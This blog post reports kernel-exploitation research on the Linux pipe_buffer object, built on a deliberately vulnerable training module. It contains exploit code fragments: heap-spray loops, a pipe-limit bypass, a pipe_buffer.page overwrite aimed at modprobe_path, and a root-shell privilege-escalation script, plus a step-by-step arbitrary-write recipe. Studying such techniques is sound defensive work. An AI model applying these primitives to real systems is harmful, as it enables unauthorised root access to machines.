---
layout: post
title: "Some notes on the security properties of the pipe_buffer kernel object"
date: 2026-04-20 13:37:00 +0300
---

Many exploits of Linux kernel vulnerabilities use the `pipe_buffer` kernel object to build strong exploit primitives. When I was experimenting with my personal project [kernel-hack-drill](https://github.com/a13xp0p0v/kernel-hack-drill), I discovered some interesting properties of `pipe_buffer`, which may not be described in public articles (at least, I didn't find them). That's why I decided to write this short post and share my thoughts.

<center><img src="/img/pipe_buffer_experiments.jpg" width="80%"></center><br>

## Intro

The `pipe()` system call makes the Linux kernel allocate an array of `pipe_buffer` objects:
```c
struct pipe_buffer {
	struct page *              page;                 /*     0     8 */
	unsigned int               offset;               /*     8     4 */
	unsigned int               len;                  /*    12     4 */
	const struct pipe_buf_operations  * ops;         /*    16     8 */
	unsigned int               flags;                /*    24     4 */

	/* XXX 4 bytes hole, try to pack */

	long unsigned int          private;              /*    32     8 */

	/* size: 40, cachelines: 1, members: 6 */
	/* sum members: 36, holes: 1, sum holes: 4 */
	/* last cacheline: 40 bytes */
};
```

As I noticed, the `pipe_buffer` kernel object provides a number of facilities for attackers:
 - Corrupting the `flags` field of `pipe_buffer` can be used to implement a [Dirty Pipe attack](https://dirtypipe.cm4all.com/) and overwrite read-only files.
 - Corrupting the `pipe_buffer.ops` enables control-flow hijacking in the kernelspace.
 - Corrupting the `page`, `offset`, and `len` fields of this object allows building arbitrary address read and write (AARW).
 - Partial overwriting of the `page` field allows us to point the attacked pipe to the page of another pipe and gain page use-after-free (the [PageJack](https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf) technique).

The size of a `pipe_buffer` array depends on the pipe capacity. The default capacity is 65536 bytes, which is equal to 16 pages. The `pipe_buffer` array for such a pipe contains 16 elements and is allocated in the `kmalloc-1k` slab cache (`16 * 40 = 640` bytes).

An attacker is able to resize the `pipe_buffer` array in the kernelspace by changing the capacity of a pipe with `fcntl(pipe_fd[1], F_SETPIPE_SZ, size)`. The kernel rounds the requested `size` up to the nearest power-of-two number of pages (see the [round_pipe_size()](https://elixir.bootlin.com/linux/v6.18/source/fs/pipe.c#L1272) function). The file `/proc/sys/fs/pipe-max-size` contains the maximum size limit for an unprivileged user (1048576 bytes, 256 pages). The minimum pipe capacity is 4096 bytes (one page).

All this makes `pipe_buffer` a very powerful tool in the kernel hacker's hands. Now let me describe some interesting aspects that I encountered during my [kernel-hack-drill](https://github.com/a13xp0p0v/kernel-hack-drill) experiments. You can find more information about this project in [my article](https://a13xp0p0v.tech/2025/09/02/kernel-hack-drill-and-CVE-2024-50264.html).

There are two exploit prototypes in `kernel-hack-drill` that employ `pipe_buffer` objects:
 - [drill_uaf_w_pipe_buffer.c](https://github.com/a13xp0p0v/kernel-hack-drill/blob/master/drill_uaf_w_pipe_buffer.c) -- a basic UAF exploit that writes into a freed `drill_item_t` object; it performs a cross-cache attack and overwrites `pipe_buffer.flags` to implement the Dirty Pipe technique and gain LPE.
 - [drill_oob_w_pipe_buffer.c](https://github.com/a13xp0p0v/kernel-hack-drill/blob/master/drill_oob_w_pipe_buffer.c) -- a basic out-of-bounds write (OOBW) exploit that corrupts the `pipe_buffer.page` pointer to perform arbitrary address read/write (AARW) of kernel memory via a pipe and gain LPE.

Disclaimer: I **do not** claim that my findings, which I am going to describe, are novel or unknown in the security community. I decided to publish this short article to share the knowledge and maybe provoke a discussion. If you have any public references to these tricks, please let me know!

## Experiment number 1

For successful kernel heap spraying and cross-cache attack, it is required to occupy free slots in the target slab cache, or "plug the holes" in slabs, in other words. For that purpose, the attacker may need to create a lot of pipes. I've encountered an interesting behavior during that exercise.

After creating plenty of pipes and then resizing their capacity to `PAGE_SIZE * 2`, I examined the `kmalloc-96` slab cache. I expected to see only an active slab and an empty partial list in `kmem_cache_cpu` and `kmem_cache_node`. However, I found a lot of partial slabs with free slots 🧐. Digging into this in the userspace and kernelspace revealed a limit that I didn't know about. Consider the following code:

```c
#define PIPES_N 2048

for (i = 0; i < PIPES_N; i++) {
	ret = pipe(pipe_fds[i]);
	if (ret < 0) {
		perror("[-] pipe");
		goto end;
	}
}
printf("[+] %d pipes are created\n", PIPES_N);

for (i = 0; i < PIPES_N; i++) {
	printf("[+] pipe %ld:\n", i);

	ret = fcntl(pipe_fds[i][1], F_GETPIPE_SZ);
	if (ret < 0) {
		perror("[-] fcntl F_GETPIPE_SZ");
		goto end;
	}
	printf("  F_GETPIPE_SZ before: %d\n", ret);

	ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * 2);
	if (ret < 0) {
		perror("[-] fcntl F_SETPIPE_SZ");
		goto end;
	}
	printf("  F_SETPIPE_SZ: %d\n", ret);

	ret = fcntl(pipe_fds[i][1], F_GETPIPE_SZ);
	if (ret < 0) {
		perror("[-] fcntl F_GETPIPE_SZ");
		goto end;
	}
	printf("  F_GETPIPE_SZ after: %d\n", ret);
}
```

To run this code, you first need to increase the maximum number of file descriptors that can be opened by the current process (`RLIMIT_NOFILE`). It is an unprivileged operation. Then the given code produces the following output:

```
...
[+] pipe 1022:
  F_GETPIPE_SZ before: 65536
  F_SETPIPE_SZ: 8192
  F_GETPIPE_SZ after: 8192
[+] pipe 1023:
  F_GETPIPE_SZ before: 65536
  F_SETPIPE_SZ: 8192
  F_GETPIPE_SZ after: 8192
[+] pipe 1024:
  F_GETPIPE_SZ before: 8192
  F_SETPIPE_SZ: 8192
  F_GETPIPE_SZ after: 8192
[+] pipe 1025:
  F_GETPIPE_SZ before: 8192
  F_SETPIPE_SZ: 8192
  F_GETPIPE_SZ after: 8192
[+] pipe 1026:
  F_GETPIPE_SZ before: 8192
  F_SETPIPE_SZ: 8192
  F_GETPIPE_SZ after: 8192
...
```

Here you can see that the initial pipe capacity changed from 65536 to 8192 after creating 1024 pipes. I've found out that the `alloc_pipe_info()` kernel function in [fs/pipe.c](https://elixir.bootlin.com/linux/v6.18/source/fs/pipe.c#L792) is responsible for this behavior:

```c
/*
 * New pipe buffers will be restricted to this size while the user is exceeding
 * their pipe buffer quota. The general pipe use case needs at least two
 * buffers: one for data yet to be read, and one for new data. If this is less
 * than two, then a write to a non-empty pipe may block even if the pipe is not
 * full. This can occur with GNU make jobserver or similar uses of pipes as
 * semaphores: multiple processes may be waiting to write tokens back to the
 * pipe before reading tokens: https://lore.kernel.org/lkml/1628086770.5rn8p04n6j.none@localhost/.
 *
 * Users can reduce their pipe buffers with F_SETPIPE_SZ below this at their
 * own risk, namely: pipe writes to non-full pipes may block until the pipe is
 * emptied.
 */
#define PIPE_MIN_DEF_BUFFERS 2

/* ... */

if (too_many_pipe_buffers_soft(user_bufs) && pipe_is_unprivileged_user()) {
	user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);
	pipe_bufs = PIPE_MIN_DEF_BUFFERS;
}

if (too_many_pipe_buffers_hard(user_bufs) && pipe_is_unprivileged_user())
	goto out_revert_acct;

pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
		     GFP_KERNEL_ACCOUNT);
```

This `too_many_pipe_buffers_soft()` helper is [defined](https://elixir.bootlin.com/linux/v6.18/source/fs/pipe.c#L773) in the same file:

```c
bool too_many_pipe_buffers_soft(unsigned long user_bufs)
{
	unsigned long soft_limit = READ_ONCE(pipe_user_pages_soft);

	return soft_limit && user_bufs > soft_limit;
}
```

You can find the value of the `pipe-user-pages-soft` limit in the `/proc/sys/fs/pipe-user-pages-soft` file. By default, it is 16384 pages.

Ha, that's funny! Let's see what happened:
 - When the exploit prototype creates pipes in a loop, the kernel allocates `pipe_buffer` arrays containing 16 elements each (as mentioned in the intro).
 - After creating 1024 pipes, we have `1024 * 16 = 16384` pages allocated for them and hit the `pipe-user-pages-soft` limit.
 - The pipes created later have a smaller capacity of `2 * PAGE_SIZE` bytes. The kernel allocates them from the `kmalloc-96` slab cache (`2 * 40 = 80` bytes).
 - So when my unlucky kernel heap spray calls `fcntl()`, it only reallocates `pipe_buffer` objects in `kmalloc-96` and does not occupy new slots.

That's why the kernel has many slabs in the partial lists of `kmem_cache_cpu` and `kmem_cache_node` of `kmalloc-96`.

There is a simple bypass for this limitation: calling `fcntl()` just after creating a pipe decreases the maximum number of used pages, so we don't hit the `pipe-user-pages-soft` limit. See the code in [drill_oob_w_pipe_buffer.c](https://github.com/a13xp0p0v/kernel-hack-drill/blob/master/drill_oob_w_pipe_buffer.c):

```c
for (i = 0; i < PIPES_N; i++) {
	ret = pipe(pipe_fds[i]);
	if (ret < 0) {
		perror("[-] pipe");
		goto end;
	}

	/*
	 * Change the pipe_buffer array size to 2 * sizeof(struct pipe_buffer),
	 * which is 80 bytes. It should live in kmalloc-96 together with
	 * the drill_item_t object.
	 *
	 * We should resize the pipe capacity right now to avoid hitting
	 * the limit in /proc/sys/fs/pipe-user-pages-soft.
	 */
	ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * 2);
	if (ret != PAGE_SIZE * 2) {
		perror("[-] fcntl");
		goto end;
	}

	/* ... */
}
```

However, this creates some noise in the heap spray, because the kernel also allocates other objects during pipe creation.

## Experiment number 2

As I mentioned, [drill_oob_w_pipe_buffer.c](https://github.com/a13xp0p0v/kernel-hack-drill/blob/master/drill_oob_w_pipe_buffer.c) is a PoC exploit that performs a basic out-of-bounds write (OOBW) into the `pipe_buffer` object. The first three fields of `struct pipe_buffer`, which can be overwritten, are `struct page *page`, `unsigned int offset`, and `unsigned int len`. Overwriting all of them with controlled bytes allows a trivial arbitrary address read/write (AARW) of kernel memory via a pipe.

However, I wanted to make the `drill_oob_w_pipe_buffer.c` more interesting by restricting the overwrite to only the first 8 bytes. That means corrupting only the `pipe_buffer.page` pointer with controlled data. While experimenting with this exploit primitive, I've found an aspect of kernel behavior that allows performing a nice trick. Let's look at it step by step.

After resizing a pipe to allocate its `pipe_buffer` array in a `kmalloc-96` slab, I write a full page into this pipe:

```c
/*
 * Change the pipe_buffer array size to 2 * sizeof(struct pipe_buffer),
 * which is 80 bytes. It should live in kmalloc-96 together with
 * the drill_item_t object.
 *
 * We should resize the pipe capacity right now to avoid hitting
 * the limit in /proc/sys/fs/pipe-user-pages-soft.
 */
ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * 2);
if (ret != PAGE_SIZE * 2) {
	perror("[-] fcntl");
	goto end;
}

/* Fill one page in this pipe */
bytes = write(pipe_fds[i][1], pipe_data, PAGE_SIZE);
if (bytes != PAGE_SIZE) {
	printf("[-] write to pipe returned %zd\n", bytes);
	goto end;
}
```

At this point, the `pipe_buffer` array in the kernelspace looks like this:

```
gef> p *(struct pipe_buffer *)(0xffff88800d043240 + 0)
$14 = {
  page = 0xffffea00003654c0,
  offset = 0x0,
  len = 0x1000,
  ops = 0xffffffff82425fc0 <anon_pipe_buf_ops>,
  flags = 0x10,
  private = 0x0
}
gef> p *(struct pipe_buffer *)(0xffff88800d043240 + 40)
$15 = {
  page = 0x0,
  offset = 0x0,
  len = 0x0,
  ops = 0x0,
  flags = 0x0,
  private = 0x0
}
```

Then the memory corruption of the `page` pointer of the first `pipe_buffer` is performed:

```c
/*
 * Overwrite pipe_buffer.page:
 *  - the page field in pipe_buffer is at the offset 0;
 *  - DRILL_ACT_SAVE_VAL with 80 as 2nd argument starts at the offset 96,
 *    which is exactly at the offset 0 of the next object near drill_item_t.
 */
printf("[!] trying to overwrite pipe_buffer.page after drill_item_t with 0x%lx...\n",
		MODPROBE_PATH_PAGE_ADDR);
snprintf(act_args, sizeof(act_args), "0x%lx 80", MODPROBE_PATH_PAGE_ADDR);
ret = act(act_fd, DRILL_ACT_SAVE_VAL, 0, act_args);
if (ret == EXIT_FAILURE)
	goto end;
printf("[+] DRILL_ACT_SAVE_VAL 0x%lx to item 0 at offset 80\n", MODPROBE_PATH_PAGE_ADDR);
```

The `pipe_buffer.page` pointer is overwritten by the value `0xffffea00000b5200`, which is the address of the `struct page` containing `modprobe_path`. Then I read the whole page back from this pipe:

```c
bytes = read(pipe_fds[i][0], pipe_data, PAGE_SIZE);
if (bytes != PAGE_SIZE) {
	printf("[-] read from pipe returned %zd\n", bytes);
	goto end;
}
```

After reading 4096 bytes from the pipe, the first `pipe_buffer` object is discarded and its `ops` becomes `NULL`:

```
gef> p *(struct pipe_buffer *)(0xffff88800d043240 + 0)
$19 = {
  page = 0xffffea00000b5200,
  offset = 0x1000,
  len = 0x0,
  ops = 0x0,
  flags = 0x10,
  private = 0x0
}
gef> p *(struct pipe_buffer *)(0xffff88800d043240 + 40)
$20 = {
  page = 0x0,
  offset = 0x0,
  len = 0x0,
  ops = 0x0,
  flags = 0x0,
  private = 0x0
}
```

At this point, we have the full contents of the attacked page in the `pipe_data` userspace buffer. We can modify the `modprobe_path` string there.

But what would happen if we simply write these 4096 bytes back to the pipe?

```c
/* Write the page with modified modprobe_path back to the pipe */
bytes = write(pipe_fds[corrupted_pipe_n][1], pipe_data, PAGE_SIZE);
if (bytes != PAGE_SIZE) {
	printf("[-] write to pipe returned %zd\n", bytes);
	goto end;
}
```

I've found out that, surprisingly, this data overwrites the kernel page containing `modprobe_path`! That's the state of the `pipe_buffer` array after writing to the pipe:

```
gef> p *(struct pipe_buffer *)(0xffff88800d043240 + 0)
$27 = {
  page = 0xffffea00000b5200,
  offset = 0x1000,
  len = 0x0,
  ops = 0x0,
  flags = 0x10,
  private = 0x0
}
gef> p *(struct pipe_buffer *)(0xffff88800d043240 + 40)
$28 = {
  page = 0xffffea00000b5200,
  offset = 0x0,
  len = 0x1000,
  ops = 0xffffffff82425fc0 <anon_pipe_buf_ops>,
  flags = 0x10,
  private = 0x0
}
```

Hm, interesting. Somehow the `struct page` pointer in the second pipe buffer got the attacker's value `0xffffea00000b5200`. That happens because the `anon_pipe_write()` kernel function [contains](https://elixir.bootlin.com/linux/v6.18/source/fs/pipe.c#L515) this code:

```c
struct pipe_buffer *buf;
struct page *page;
int copied;

page = anon_pipe_get_page(pipe);
if (unlikely(!page)) {
	if (!ret)
		ret = -ENOMEM;
	break;
}

copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
if (unlikely(copied < PAGE_SIZE && iov_iter_count(from))) {
	anon_pipe_put_page(pipe, page);
	if (!ret)
		ret = -EFAULT;
	break;
}

pipe->head = head + 1;
/* Insert it into the buffer array */
buf = pipe_buf(pipe, head);
buf->page = page;
buf->ops = &anon_pipe_buf_ops;
buf->offset = 0;
```

An important aspect here: the value for the `page` pointer of the next `pipe_buffer` is returned by `anon_pipe_get_page(pipe)`:

```c
static struct page *anon_pipe_get_page(struct pipe_inode_info *pipe)
{
	for (int i = 0; i < ARRAY_SIZE(pipe->tmp_page); i++) {
		if (pipe->tmp_page[i]) {
			struct page *page = pipe->tmp_page[i];
			pipe->tmp_page[i] = NULL;
			return page;
		}
	}

	return alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
}
```

The `pipe_inode_info` kernel object contains `struct page *tmp_page[2]` for caching the released pages. When the first attacked `pipe_buffer` was completely consumed by reading in a previous step, `anon_pipe_put_page()` saved the corrupted `page` pointer into `pipe_inode_info.tmp_page`. Nice!

To sum up, I see a simple and efficient AARW procedure that requires corrupting only the `pipe_buffer.page` pointer:

1. Resize a pipe to allocate its `pipe_buffer` array in a target slab.
2. Write a full page into this pipe.
3. Perform the corruption of the `page` field of the first `pipe_buffer` in order to point it to some interesting kernel memory (for example, a page containing `modprobe_path`).
4. Read the whole page of kernel data back from this pipe into a userspace buffer.
5. Modify the contents of this userspace buffer (for example, overwrite the `modprobe_path` string there).
6. Simply write these 4096 bytes back to the pipe.
7. The target kernel memory is modified via the second `pipe_buffer`.

Success!

## Experiment number 3

Then I decided to explore how to repeat the described memory corruption procedure. I wondered how to read and write multiple memory pages if we are able to corrupt `pipe_buffer.page` multiple times.

For this experiment, I extended the size of the `drill_item_t` object:

```diff
diff --git a/drill.h b/drill.h
index d51393c..c2b0e41 100644
--- a/drill.h
+++ b/drill.h
@@ -20,7 +20,7 @@ enum drill_act_t {
        DRILL_ACT_RESET = 5
 };
 
-#define DRILL_ITEM_SIZE 95
+#define DRILL_ITEM_SIZE 191
 
 struct drill_item_t {
        unsigned long foobar;
```

I also resized the pipes using `fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * 4)` to make the kernel allocate the `pipe_buffer` arrays in `kmalloc-192` (`4 * 40 = 160` bytes).

The following gdb commands allowed me to conveniently monitor the status of the corrupted `pipe_buffer` array, which contains 4 elements:

```
gef> p ((struct pipe_inode_info *)0xffff88800cbd3780)->bufs
$1 = (struct pipe_buffer *) 0xffff88800cbd3180
gef> p ((struct pipe_inode_info *)0xffff88800cbd3780)->tmp_page
$2 = {
  [0x0] = 0xffffea00000b5200,
  [0x1] = 0x0
}
gef> p *((struct pipe_buffer (*)[4])(0xffff88800cbd3180))
$3 = {
  [0x0] = {
    page = 0xffffea00000b5200,
    offset = 0x1000,
    len = 0x0,
    ops = 0x0,
    flags = 0x10,
    private = 0x0
  },
  [0x1] = {
    page = 0x0,
    offset = 0x0,
    len = 0x0,
    ops = 0x0,
    flags = 0x0,
    private = 0x0
  },
  [0x2] = {
    page = 0x0,
    offset = 0x0,
    len = 0x0,
    ops = 0x0,
    flags = 0x0,
    private = 0x0
  },
  [0x3] = {
    page = 0x0,
    offset = 0x0,
    len = 0x0,
    ops = 0x0,
    flags = 0x0,
    private = 0x0
  }
}
```

I performed multiple writing a full page to the pipe, reading a full page from it, and corrupting the `page` pointer of the first `pipe_buffer`. This allowed me to find out that:

> To repeat the corruption of the `page` field of the first `pipe_buffer` and change it to a different value, we need to cycle through all objects in the `pipe_buffer` array and perform OOBW exactly after writing a full page to this first `pipe_buffer`.

Otherwise, the `pipe_buffer.page` value from the second OOBW is overwritten by the value from the first OOBW, which has been cached in `pipe_inode_info.tmp_page`.

## Experiment number 4

In the [drill_oob_w_pipe_buffer.c](https://github.com/a13xp0p0v/kernel-hack-drill/blob/master/drill_oob_w_pipe_buffer.c) PoC exploit, the privilege escalation script restores `modprobe_path` to the original value:

```c
ret = dprintf(script_fd,
	      "#!/bin/sh\n"
	      "echo \"%s\" > /proc/sys/kernel/modprobe\n"
	      "/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
	      modprobe_path, pid, shell_stdin_fd, pid, shell_stdout_fd);
if (ret < 0) {
	perror("[-] dprintf for privesc_script");
	return EXIT_FAILURE;
}
```

However, when I run `drill_oob_w_pipe_buffer` and then exit from the root shell, I see strange behavior of the Linux kernel in the `defconfig` configuration. The contents of `/proc/sys/kernel/modprobe` unexpectedly change:

```
# 
# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0
# 
# cat /proc/sys/kernel/modprobe
/sbin/modprobe
# 
# exit
[!] root shell is finished
[+] restored modprobe_path: /sbin/modprobe
[+] success, the end
user@syzkaller:~$ 
user@syzkaller:~$ cat /proc/sys/kernel/modprobe
�"�
user@syzkaller:~$ cat /proc/sys/kernel/modprobe
�"�
user@syzkaller:~$ 
```

Interesting. It looks like closing the corrupted pipe returns the attacked page `0xffffea00000b5200` back to the page allocator and the kernel reallocates it for some other data.

Unpredictable corruption of the kernel code is not in our plans. I see two ways to cope with this trouble:
 - Restoring `pipe_buffer.page` to the original value. That would require a prior kernel infoleak and an additional OOB write. However, there might be some obstacles caused by a cached address in `tmp_page`.
 - Simply not closing the pipe ☺️.

I've chosen the second approach for the `drill_oob_w_pipe_buffer.c` prototype:

```c
for (i = 0; i < PIPES_N; i++) {
	if (i == corrupted_pipe_n)
		continue;

	if (pipe_fds[i][0] >= 0) {
		if (close(pipe_fds[i][0]) < 0)
			perror("[-] close pipe");
	}
	if (pipe_fds[i][1] >= 0) {
		if (close(pipe_fds[i][1]) < 0)
			perror("[-] close pipe");
	}
}

/* ... */

ret = daemon(1, 1);
if (ret != 0)
	perror("[-] daemon");
while (1)
	sleep(42);
```

Here I skip closing the corrupted pipe and then use the `daemon()` function from `glibc`. It allows detaching the PoC exploit from the controlling terminal and running it in the background as a system daemon.

With this trick, `drill_oob_w_pipe_buffer` can be executed for privilege escalation multiple times.

When I discussed this experiment with my friend [Andrey Konovalov aka xairy](https://x.com/andreyknvl), we came up with a funny idea: create a pipe, write the address of some `struct page` to `pipe_buffer.page` using memory corruption, and then simply close this pipe. In that case, the attacked page would be returned to the page allocator, and we would be able to reclaim it again 😊. For example, a page belonging to a `MIGRATE_MOVABLE` allocation can be reused for a userspace mapping. So the `pipe_buffer` object provides strong opportunities for attackers 🔥.

## Conclusion

The `pipe_buffer` kernel object is popular among Linux kernel security researchers because it allows building strong exploit primitives. Experimenting with my personal project [kernel-hack-drill](https://github.com/a13xp0p0v/kernel-hack-drill) revealed some interesting properties of `pipe_buffer`, which I shared in this article. If you have seen these tricks described in other sources, please let me know, and I will add your references.

Thanks for reading!

<center><img src="/img/pipe_buffer_experiments_done.jpg" width="80%"></center><br>
